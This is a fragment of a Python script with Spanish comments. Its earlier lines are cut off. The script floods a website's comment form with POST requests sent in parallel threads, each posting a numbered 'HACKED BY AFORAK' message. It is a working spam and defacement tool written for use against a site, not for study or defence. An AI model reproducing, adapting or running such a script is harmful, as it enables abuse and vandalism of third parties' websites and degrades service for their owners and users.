...
delay = 2  # Retraso en segundos entre las solicitudes

def send_request(i):
    data = {
        "commentbody": f"HACKED BY AFORAK{i}",  # Añade el contador al comentario para hacerlo único
        "sendcomment": "Publicar",
        "replycomment": ""  # Aquí debes poner el valor que corresponda
    }
    response = requests.post(url, headers=headers, data=data)
    print(f"¡Publicado con éxito en el hilo {i}!")

# Crea un pool de hilos y envía las solicitudes en paralelo
with concurrent.futures.ThreadPoolExecutor() as executor:
    for i in range(num_requests):
        executor.submit(send_request, i)
        time.sleep(delay)  # Espera antes de enviar la próxima solicitud
